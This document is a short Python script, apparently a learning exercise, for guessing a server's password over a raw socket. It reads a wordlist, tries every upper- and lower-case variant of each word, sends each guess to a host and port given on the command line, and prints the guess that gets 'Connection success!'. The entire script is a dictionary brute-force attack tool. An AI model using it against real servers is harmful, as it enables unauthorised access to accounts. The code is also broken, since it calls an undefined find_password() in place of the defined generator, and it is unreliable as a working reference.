import socket
from argparse import ArgumentParser
import itertools

CHAR = '0123456789abcdefghijklmnopqrstuvwxyz'


# Custom generator
def dict_based_find_password():
    with open('passwords.txt', 'r') as file:
        data = file.read().splitlines()
        for pw in data:
            possible_letters = [[letter.lower(), letter.upper()] for letter in pw]
            # or
            # possible_letters = ([letter.lower(), letter.upper()] for letter in pw)

            pool = itertools.product(*possible_letters)
            for s in pool:
                yield ''.join(s)


parser = ArgumentParser()
parser.add_argument('host', type=str, help='The ip address of the sever you want to connect.')
parser.add_argument('port', type=int, help='The port of the sever you want to connect.')
args = parser.parse_args()

with socket.socket() as client_connection:
    address = (args.host, args.port)
    client_connection.connect(address)

    password_generator = find_password()

    for password in password_generator:
        message = password.encode()
        client_connection.send(message)
        response = client_connection.recv(1024)
        response = response.decode()

        if response == 'Connection success!':
            print(password)
            break